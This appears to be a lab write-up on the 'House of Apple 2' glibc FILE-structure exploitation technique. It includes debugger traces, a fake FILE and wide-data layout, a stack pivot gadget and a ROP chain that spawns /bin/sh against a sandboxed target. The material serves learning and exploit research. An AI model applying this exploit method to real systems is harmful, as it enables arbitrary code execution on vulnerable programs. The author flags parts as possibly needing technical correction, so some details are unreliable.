# House of Apple 2

> **Note:** This article is a work in progress. Some sections still require technical corrections and further refinement.

**File Stream Oriented Programming (FSOP).** This is about abusing glibc file stream structures to hijack control flow. One way to do this is by corrupting the vtable dispatch mechanism of `_IO_FILE_plus`. Modern glibc validates this vtable, so the obvious approach of replacing it with an arbitrary address doesn't work.

**House of Apple 2** works around this restriction by using a valid `_IO_FILE_plus` vtable to reach the wide-character stream machinery, where a secondary vtable is directly dispatched without range validation. This provides an `arbitrary call` primitive that we can escalate into a stack pivot and a ROP chain.

This repository is a self-contained playground I built after completing the [pwn.college File Struct Exploitation module](https://pwn.college/software-exploitation/file-struct-exploits/). The module is great, but after finishing it I wanted to explore how these techniques translate to the latest versions of glibc. All experiments here use glibc 2.43, shipped with the latest distros available at the time of writing, such as Ubuntu 26.04 and Fedora Workstation 44.

## Exploitation prerequisites

This exploration assumes that we can overwrite a `FILE` structure and that we have both a heap leak and a libc leak. The target binary already provides this.

## Sandbox environment

The sandbox runs Ubuntu 26.04 LTS, giving us a modern environment to explore the technique.

The image includes GDB, pwndbg, pwntools, ropper and tmux. It also contains a target binary with an interactive menu for invoking file stream operations such as `fopen`, `fread`, `fwrite`, and `fclose`. This gives us a convenient way to manipulate streams while debugging and testing ideas.

Build and run the sandbox with:

```
./build.sh
./run.sh
```

## Exploration

Let's start by inspecting the `_IO_FILE` and `_IO_FILE_plus` structures:

```c
pwndbg> ptype struct _IO_FILE
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2 : 24;
    char _short_backupbuf[1];
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    struct _IO_FILE **_prevchain;
    int _mode;
    int _unused3;
    __uint64_t _total_written;
    char _unused2[8];
}
pwndbg> ptype struct _IO_FILE_plus
type = struct _IO_FILE_plus {
    FILE file;
    const struct _IO_jump_t *vtable;
}
```

In practical terms, `_IO_FILE_plus` is an `_IO_FILE` with a vtable pointer. That immediately looks interesting: if we can control this pointer, we may be able to redirect an indirect call and hijack control flow.

### Inspecting the file stream vtable

To inspect the vtable, let's examine a `FILE` pointer returned by `fopen`.

```c
pwndbg> p *(struct _IO_FILE_plus *)0x37ecf010
$4 = {
  file = {
    _flags = 0xfbad2480,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7f58a7f4b4a0 <_IO_2_1_stderr_>,
    _fileno = 0x3,
    _flags2 = 0x0,
    _short_backupbuf = "",
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "",
    _lock = 0x37ecf0f0,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x37ecf100,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    _prevchain = 0x7f58a7f4b480 <_IO_list_all>,
    _mode = 0x0,
    _unused3 = 0x0,
    _total_written = 0x0,
    _unused2 = "\000\000\000\000\000\000\000"
  },
  vtable = 0x7f58a7f49030 <_IO_file_jumps>
}
```

The pointer targets the `_IO_file_jumps` table.

![3](./images/3.png)

This is a set of 21 function pointers. File stream operations dispatch through different entries depending on the execution path.

### Following the `fwrite` path

For this exploration I'll focus on the `fwrite` path. After placing breakpoints on each function and calling `fwrite`, the first breakpoint we hit is `_IO_file_xsputn`.

![4](./images/4.png)

The call happens at `fwrite+216`. This matches the [glibc source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/iofwrite.c#L44): `_IO_sputn` is a macro that dispatches through the vtable, resolving to `_IO_file_xsputn` for this stream.

```asm
   0x00007fd5181d362a <+202>:	mov    rdx,rcx
   0x00007fd5181d362d <+205>:	mov    rdi,rbx
   0x00007fd5181d3630 <+208>:	mov    QWORD PTR [rbp-0x30],r8
   0x00007fd5181d3634 <+212>:	mov    QWORD PTR [rbp-0x28],rcx
   0x00007fd5181d3638 <+216>:	call   QWORD PTR [rax+0x38]
```

### Attempting to replace the vtable

For a first attempt, let's overwrite the vtable pointer with `desired_func - 0x38` and set a breakpoint at `fwrite+216`.

```c
pwndbg> p &win
$3 = (<text variable, no debug info> *) 0x4019e1 <win>
pwndbg> p/x &win - 0x38
$4 = 0x4019a9
pwndbg> set ((struct _IO_FILE_plus *)0x5334010)->vtable = (void *)0x4019a9
pwndbg> b *fwrite+216
Breakpoint 4 at 0x7fd5181d3638: file ./libio/libioP.h, line 1042.
```

Oops, execution aborts before reaching the breakpoint. The error suggests that glibc validates the vtable pointer before performing the indirect call. Let's inspect the backtrace and see where this happens.

![5](./images/5.png)

`fwrite` reaches `_IO_vtable_check` which is rejecting the forged vtable pointer.

![6](./images/6.png)

The implementation contains a mechanism for accepting foreign vtables, but it is not under our control. The relevant code is available in [`vtables.c`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/vtables.c#L504).

### Understanding the vtable validation

By the time `_IO_vtable_check` is called, we're already doomed. The earlier `IO_validate_vtable` frame in the backtrace is the interesting part, so let's inspect that instead.

```c
pwndbg> disass IO_validate_vtable
❌️ No symbol "IO_validate_vtable" in current context.
```

GDB cannot resolve `IO_validate_vtable` as a symbol. Looking at the [source](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/libioP.h#L1033), we can see it is inlined into `fwrite`.

```asm
   0x00007fd5181d35f6 <+150>:	lea    rdi,[rip+0x1838e3]        # 0x7fd518356ee0 <__io_vtables>
   0x00007fd5181d35fd <+157>:	mov    rax,QWORD PTR [rbx+0xd8]
   0x00007fd5181d3604 <+164>:	mov    r14,QWORD PTR [rbx+0xc8]
   0x00007fd5181d360b <+171>:	mov    r15,QWORD PTR [rbx+0x28]
   0x00007fd5181d360f <+175>:	mov    r12,QWORD PTR [rbx+0x20]
   0x00007fd5181d3613 <+179>:	mov    rdx,rax
   0x00007fd5181d3616 <+182>:	sub    rdx,rdi
   0x00007fd5181d3619 <+185>:	cmp    rdx,0x92f
   0x00007fd5181d3620 <+192>:	ja     0x7fd5181d3780 <__GI__IO_fwrite+544>
```

A vtable pointer is accepted only when it falls within `[__io_vtables, __io_vtables + IO_VTABLES_LEN)`. So we cannot simply point it anywhere we want. Still, this is a fairly large region containing several jump tables, which gives us something to explore.

The valid range begins as follows:

![7](./images/7.png)

## House of Apple 2

We now understand the basic mechanism and its main constraint: the `_IO_FILE_plus` vtable must point somewhere inside glibc's valid vtable region. This blocks the obvious approach but it does not completely close the door.

House of Apple 2 gets around this by reaching a second vtable through the wide-character stream machinery. This second vtable is not validated in the same way. Let's follow that path in GDB and see how the pieces connect.

### The wide-character stream machinery

Back in `_IO_FILE`, there is a `_wide_data` field pointing to an `_IO_wide_data` structure. This structure has a vtable of its own.

```c
pwndbg> ptype struct _IO_wide_data
type = struct _IO_wide_data {
    wchar_t *_IO_read_ptr;
    wchar_t *_IO_read_end;
    wchar_t *_IO_read_base;
    wchar_t *_IO_write_base;
    wchar_t *_IO_write_ptr;
    wchar_t *_IO_write_end;
    wchar_t *_IO_buf_base;
    wchar_t *_IO_buf_end;
    wchar_t *_IO_save_base;
    wchar_t *_IO_backup_base;
    wchar_t *_IO_save_end;
    __mbstate_t _IO_state;
    __mbstate_t _IO_last_state;
    struct _IO_codecvt _codecvt;
    wchar_t _shortbuf[1];
    const struct _IO_jump_t *_wide_vtable;
}
```

Its layout looks quite similar to `_IO_FILE`. It is part of glibc's machinery for handling wide-character streams.

The path we want goes through [`_IO_wfile_overflow`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wfileops.c#L407), which can eventually call [`_IO_wdoallocbuf`](https://elixir.bootlin.com/glibc/glibc-2.43/source/libio/wgenops.c#L364).

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == NULL)
	{
	  _IO_wdoallocbuf (f); // <- this is it
	  _IO_free_wbackup_area (f);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);
	}
      else
	{
      ...
```

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
```

`_IO_WDOALLOCATE` is another dispatch macro, this time operating through the wide vtable. The indirect call becomes clear in the disassembly:

![8](./images/8.png)

Here is the interesting part. At `_IO_wdoallocbuf+44` glibc loads the `_wide_vtable` pointer from `_wide_data`. At `_IO_wdoallocbuf+55` it calls the function pointer at `_wide_vtable + 0x68`. This time there is no range validation.

### Connecting the two vtables

Now the pieces start to connect. `_IO_wfile_overflow` belongs to `_IO_wfile_jumps` which exists inside the valid range accepted by the first vtable check. From there, execution can reach another indirect call through the unvalidated `_wide_vtable`.

![9](./images/9.png)

```c
pwndbg> p &__io_vtables < &_IO_wfile_jumps < (void *)&__io_vtables+0x92f
$5 = 0x1
```

The general idea is now:

1. Set the `_IO_FILE_plus` vtable so that the relevant slot resolves to `_IO_wfile_overflow`.
2. Point `_wide_data` to a forged `_IO_wide_data` structure whose `_wide_vtable` is `desired_function - 0x68`.

Before trying the next run, we need to satisfy a few conditions to reach `_IO_wdoallocbuf`.

In `_IO_wfile_overflow`:

- `_flags` must not contain `_IO_NO_WRITES` (`0x0008`)
- `_wide_data->_IO_write_base` must be `NULL`

In `_IO_wdoallocbuf`:

- `fp->_wide_data->_IO_buf_base` must be `NULL`
- `_flags` must not contain `_IO_UNBUFFERED` (`0x0002`)

There is one more detail. `_IO_FILE` contains a `_lock` field that glibc dereferences while acquiring and releasing the stream lock. We need to point it to a zero qword value in writable memory, otherwise the stream operation will crash before reaching our call.

## Control flow hijack

Everything is set, let's try again. This time the outer range check passes, and the first indirect call dispatches to `_IO_wfile_overflow`.

```asm
b► 0x7fa6fefee5f6 <fwrite+150>    lea    rdi, [rip + 0x1838e3]           RDI => 0x7fa6ff171ee0 (__io_vtables) ◂— 0
   0x7fa6fefee5fd <fwrite+157>    mov    rax, qword ptr [rbx + 0xd8]     RAX, [0x183cf0e8] => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
   0x7fa6fefee604 <fwrite+164>    mov    r14, qword ptr [rbx + 0xc8]     R14, [0x183cf0d8] => 0
   0x7fa6fefee60b <fwrite+171>    mov    r15, qword ptr [rbx + 0x28]     R15, [0x183cf038] => 0
   0x7fa6fefee60f <fwrite+175>    mov    r12, qword ptr [rbx + 0x20]     R12, [0x183cf030] => 0
   0x7fa6fefee613 <fwrite+179>    mov    rdx, rax                        RDX => 0x7fa6ff172208 (__io_vtables+808) —▸ 0x7fa6feffc340 (_IO_file_close) ◂— endbr64
   0x7fa6fefee616 <fwrite+182>    sub    rdx, rdi                        RDX => 0x328 (0x7fa6ff172208 - 0x7fa6ff171ee0)
   0x7fa6fefee619 <fwrite+185>    cmp    rdx, 0x92f                      0x328 - 0x92f     EFLAGS => 0x297 [ CF PF AF zf SF IF df of iopl:00 ac ]
   0x7fa6fefee620 <fwrite+192>  ✘ ja     fwrite+544                  <fwrite+544>

   0x7fa6fefee626 <fwrite+198>    mov    qword ptr [rbp - 0x38], r9      [0x7fffb620c618] <= 1
   0x7fa6fefee62a <fwrite+202>    mov    rdx, rcx                        RDX => 1
   0x7fa6fefee62d <fwrite+205>    mov    rdi, rbx                        RDI => 0x183cf010 ◂— 0
   0x7fa6fefee630 <fwrite+208>    mov    qword ptr [rbp - 0x30], r8      [0x7fffb620c620] <= 1
   0x7fa6fefee634 <fwrite+212>    mov    qword ptr [rbp - 0x28], rcx     [0x7fffb620c628] <= 1
   0x7fa6fefee638 <fwrite+216>    call   qword ptr [rax + 0x38]      <_IO_wfile_overflow>

```

The forged structure also satisfies the conditions in `_IO_wfile_overflow`. Execution continues into `_IO_wdoallocbuf`.

```asm
b► 0x7fa6feff5110 <_IO_wfile_overflow>        endbr64
   0x7fa6feff5114 <_IO_wfile_overflow+4>      mov    edx, dword ptr [rdi]     EDX, [0x183cf010] => 0
   0x7fa6feff5116 <_IO_wfile_overflow+6>      test   dl, 8                    0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5119 <_IO_wfile_overflow+9>    ✘ jne    _IO_wfile_overflow+352      <_IO_wfile_overflow+352>

   0x7fa6feff511f <_IO_wfile_overflow+15>     push   rbp
   0x7fa6feff5120 <_IO_wfile_overflow+16>     mov    rbp, rsp                        RBP => 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
   0x7fa6feff5123 <_IO_wfile_overflow+19>     push   rbx
   0x7fa6feff5124 <_IO_wfile_overflow+20>     mov    ebx, esi                        EBX => 0x183cf1f0 ◂— 0x41 /* 'A' */
   0x7fa6feff5126 <_IO_wfile_overflow+22>     sub    rsp, 0x18                       RSP => 0x7fffb620c5d0 (0x7fffb620c5e8 - 0x18)
   0x7fa6feff512a <_IO_wfile_overflow+26>     mov    rcx, qword ptr [rdi + 0xa0]     RCX, [0x183cf0b0] => 0x183cf018 ◂— 0
   0x7fa6feff5131 <_IO_wfile_overflow+33>     mov    rsi, qword ptr [rcx + 0x18]     RSI, [0x183cf030] => 0
   0x7fa6feff5135 <_IO_wfile_overflow+37>     test   dh, 8                           0 & 8     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5138 <_IO_wfile_overflow+40>   ✘ jne    _IO_wfile_overflow+208      <_IO_wfile_overflow+208>

   0x7fa6feff513e <_IO_wfile_overflow+46>     test   rsi, rsi                        0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff5141 <_IO_wfile_overflow+49>   ✔ je     _IO_wfile_overflow+213      <_IO_wfile_overflow+213>
    ↓
   0x7fa6feff51e5 <_IO_wfile_overflow+213>    mov    qword ptr [rbp - 0x18], rdi     [0x7fffb620c5d8] <= 0x183cf010 ◂— 0
   0x7fa6feff51e9 <_IO_wfile_overflow+217>    call   _IO_wdoallocbuf             <_IO_wdoallocbuf>

```

Finally, the checks in `_IO_wdoallocbuf` pass, and the indirect call at `_IO_wdoallocbuf+55` lands in our `win` function.

```asm
b► 0x7fa6feff3020 <_IO_wdoallocbuf>       endbr64
   0x7fa6feff3024 <_IO_wdoallocbuf+4>     mov    rax, qword ptr [rdi + 0xa0]     RAX, [0x183cf0b0] => 0x183cf018 ◂— 0
   0x7fa6feff302b <_IO_wdoallocbuf+11>    cmp    qword ptr [rax + 0x30], 0       0 - 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3030 <_IO_wdoallocbuf+16>  ✔ je     _IO_wdoallocbuf+24          <_IO_wdoallocbuf+24>
    ↓
   0x7fa6feff3038 <_IO_wdoallocbuf+24>    push   rbp
   0x7fa6feff3039 <_IO_wdoallocbuf+25>    mov    rdx, rdi              RDX => 0x183cf010 ◂— 0
   0x7fa6feff303c <_IO_wdoallocbuf+28>    mov    rbp, rsp              RBP => 0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 ◂— ...
   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>

   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
   0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
```

While we're here, it is worth looking at the register state immediately before the final indirect call.

```asm
 RAX  0x183cf088 ◂— 0xffffffffffffffff
 RBX  0x183cf1f0 ◂— 0x41 /* 'A' */
 RCX  0x183cf018 ◂— 0
 RDX  0x183cf010 ◂— 0
 RDI  0x183cf010 ◂— 0
 RSI  0
 R8   1
 R9   1
 R10  0
 R11  0x7fa6fefee560 (fwrite) ◂— endbr64
 R12  0
 R13  1
 R14  0
 R15  0
 RBP  0x7fffb620c5c0 —▸ 0x7fffb620c5f0 —▸ 0x7fffb620c650 —▸ 0x7fffb620c690 —▸ 0x7fffb620c710 ◂— ...
 RSP  0x7fffb620c5a0 —▸ 0x7fffb620c5e0 ◂— 0x20e21
*RIP  0x7fa6feff3057 (_IO_wdoallocbuf+55) ◂— call qword ptr [rax + 0x68]
──────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on]──────────────────────────────────────────────────────
   0x7fa6feff303f <_IO_wdoallocbuf+31>    sub    rsp, 0x20             RSP => 0x7fffb620c5a0 (0x7fffb620c5c0 - 0x20)
   0x7fa6feff3043 <_IO_wdoallocbuf+35>    test   byte ptr [rdi], 2     0 & 2     EFLAGS => 0x246 [ cf PF af ZF sf IF df of iopl:00 ac ]
   0x7fa6feff3046 <_IO_wdoallocbuf+38>  ✘ jne    _IO_wdoallocbuf+192         <_IO_wdoallocbuf+192>

   0x7fa6feff304c <_IO_wdoallocbuf+44>    mov    rax, qword ptr [rax + 0xe0]     RAX, [0x183cf0f8] => 0x183cf088 ◂— 0xffffffffffffffff
   0x7fa6feff3053 <_IO_wdoallocbuf+51>    mov    qword ptr [rbp - 8], rdi        [0x7fffb620c5b8] <= 0x183cf010 ◂— 0
 ► 0x7fa6feff3057 <_IO_wdoallocbuf+55>    call   qword ptr [rax + 0x68]      <win>
        rdi: 0x183cf010 ◂— 0
        rsi: 0
        rdx: 0x183cf010 ◂— 0
        rcx: 0x183cf018 ◂— 0

   0x7fa6feff305a <_IO_wdoallocbuf+58>    cmp    eax, -1
   0x7fa6feff305d <_IO_wdoallocbuf+61>  ? jne    _IO_wdoallocbuf+133         <_IO_wdoallocbuf+133>

   0x7fa6feff305f <_IO_wdoallocbuf+63>    mov    rdx, qword ptr [rbp - 8]
   0x7fa6feff3063 <_IO_wdoallocbuf+67>    mov    rax, qword ptr [rdx + 0xa0]
   0x7fa6feff306a <_IO_wdoallocbuf+74>    mov    rdi, qword ptr [rax + 0x30]
```

Both `RDI` and `RDX` point to the beginning of the controlled `FILE` structure. We do not directly control the first and third argument registers, but we control the memory they point to. Cool!

## Constructing the primitive

The primitive is implemented in [`./exp/house_of_apple2.py`](./exp/house_of_apple2.py). The straightforward approach would be to place a complete `_IO_FILE_plus`, a complete `_IO_wide_data` and a separate fake wide vtable one after another. That would work, but it would also require a rather large buffer.

We can make the payload smaller by overlapping them.

The fake `_IO_wide_data` starts at offset `0x08`, inside the fake `_IO_FILE_plus`. This works because most fields involved in the overlap can remain zero. Conveniently, `_wide_data->_IO_write_base` and `_wide_data->_IO_buf_base` overlap with `_IO_write_base` and `_IO_buf_base` in the `FILE` structure, and both pairs need to be `NULL`.

The important parts of the layout are:

| Payload offset | `_IO_FILE_plus` interpretation | `_IO_wide_data` interpretation    | Value                                            |
| -------------: | ------------------------------ | --------------------------------- | ------------------------------------------------ |
|         `0x00` | `_flags`                       | -                                 | Must not set `_IO_NO_WRITES` or `_IO_UNBUFFERED` |
|         `0x08` | `_IO_read_ptr`                 | Start of fake `_IO_wide_data`     | Zero                                             |
|         `0x20` | `_IO_write_base`               | `_IO_write_base`                  | `NULL`                                           |
|         `0x38` | `_IO_buf_base`                 | `_IO_buf_base`                    | `NULL`                                           |
|         `0x78` | `_old_offset`                  | Start of the fake wide vtable     | Overlapped vtable data                           |
|         `0x88` | `_lock`                        | -                                 | Pointer to a zero value in writable memory       |
|         `0xa0` | `_wide_data`                   | -                                 | `base + 0x08`                                    |
|         `0xd8` | `_IO_FILE_plus` vtable         | -                                 | Position that dispatches to `_IO_wfile_overflow` |
|         `0xe0` | -                              | Fake wide vtable entry at `+0x68` | Address of the arbitrary function                |
|         `0xe8` | -                              | `_wide_vtable`                    | `base + 0x78`                                    |

The last two entries are the key to the arbitrary call. `_wide_vtable` points back into the payload at offset `0x78`. When `_IO_wdoallocbuf` dispatches through `_wide_vtable + 0x68`, it reads the function pointer stored at offset `0xe0`:

```text
wide_vtable       = base + 0x78
wide_vtable+0x68  = base + 0xe0
```

This is where we place the address of the function we want to call.

The outer vtable depends on the operation used to trigger the primitive. For `fwrite`, the dispatch happens through the slot at `+0x38`, so the pointer is adjusted until that slot resolves to `_IO_wfile_overflow`. The implementation also supports `fread` and `fclose` by applying the corresponding dispatch offsets.

With this layout, a single compact buffer contains the fake `FILE` structure, the overlapping `_IO_wide_data`, the fake wide vtable and the final function pointer.

## Stack pivoting

At this point we have an arbitrary-call primitive but our control over the registers is limited. The next step is to pivot the stack into controlled memory and start a ROP chain.

```asm
pwndbg> disass __push___start_context
Dump of assembler code for function __push___start_context:
   0x00007f46729440d0 <+0>:	endbr64
   0x00007f46729440d4 <+4>:	rdsspq rcx
   0x00007f46729440d9 <+9>:	mov    rdx,rsp
   0x00007f46729440dc <+12>:	mov    rsi,QWORD PTR [rdi+0xa0]
   0x00007f46729440e3 <+19>:	lea    rsp,[rsi+0x8]
   0x00007f46729440e7 <+23>:	mov    rsi,QWORD PTR [rdi+0x3b8]
   0x00007f46729440ee <+30>:	mov    rax,QWORD PTR [rdi+0x3b0]
   0x00007f46729440f5 <+37>:	rstorssp QWORD PTR [rax+rsi*1-0x8]
   0x00007f46729440fb <+43>:	saveprevssp
   0x00007f46729440ff <+47>:	call   0x7f4672944106 <__push___start_context+54>
   0x00007f4672944104 <+52>:	jmp    0x7f4672944120 <__start_context>
   0x00007f4672944106 <+54>:	rstorssp QWORD PTR [rcx-0x8]
   0x00007f467294410b <+59>:	saveprevssp
   0x00007f467294410f <+63>:	mov    rsp,rdx
   0x00007f4672944112 <+66>:	ret
End of assembler dump.
```

At `__push___start_context+63` there is a useful `mov rsp, rdx; ret` stack pivot gadget. We already know that `RDX` points to the beginning of our controlled `FILE` structure at the time of the arbitrary call. If we call this gadget, `RSP` moves directly into our fake structure and execution continues from the values stored there. That should give us the start of a ROP chain.

## ROP

One catch, the ROP chain overlaps memory with the fake `FILE` structure, so the field constraints from `_IO_wdoallocbuf` still apply. The first qword overlaps `_flags`, which means its value must not set `_IO_NO_WRITES` (`0x8`). Our first gadget therefore needs an address with bit 3 clear in its least significant byte.

The `ret` gadget at `_nl_archive_subfreeres+96` should do the trick. It is not a `ret` instruction actually present in the original code at that boundary, but it is a valid mid-instruction gadget at that shifted address. Its least significant byte is `0x00`, so placing the address in `_flags` does not set `_IO_NO_WRITES`.

```asm
pwndbg> tele 0x7f4672919d00 1
00:0000│     0x7f4672919d00 (_nl_archive_subfreeres+96) ◂— ret
```

We have two more holes in the chain because `_IO_write_base` and `_IO_buf_base` must remain `NULL`. We can still make those slots useful by consuming them as zero values for preceding `pop` gadgets.

Finally, we cannot overwrite `_lock`, located at offset `0x88`. This leaves us with 17 qwords for the inline ROP chain, which is more than enough to achieve full control of the process.

The ROP layout in `ace.py` is:

```
0x00: _nl_archive_subfreeres+96 # pointer to ret instruction with least significant byte as 0x00
0x08: pop rdi gadget
0x10: "/bin/sh" string in libc
0x18: pop rsi gadget
0x20: 0x0000000000000000	# _IO_write_base as NULL
0x50: address to execve		# call execve("/bin/sh", NULL)
```

```bash
user@8bd829571ffe:/lab/exp$ ./ace.py
[*] '/lab/target'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/lab/target': pid 298
libc base: 0x7f5836d6c000
fp @ 0x39b1c010
[*] Switching to interactive mode
 3) fread(i)            8) overwrite_stdout
 4) fclose(i)           9) overwrite_stderr
 5) inspect(i)          0) quit
> slot [0-9]: length: data: $ ls
__pycache__  hijack_fclose.py  hijack_fwrite.py	   io_file_jumps_breakpoints.gdb
ace.py	     hijack_fread.py   house_of_apple2.py
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$
```

We have now achieved arbitrary code execution.

## Conclusion

The interesting part of House of Apple 2 is not only the arbitrary-call primitive, but also how several legitimate pieces of glibc fit together: a validated vtable, the wide-character stream machinery, an unvalidated secondary vtable and a controlled `FILE` structure. Together they allow us to move from an arbitrary call to a stack pivot and finally to arbitrary code execution through ROP.
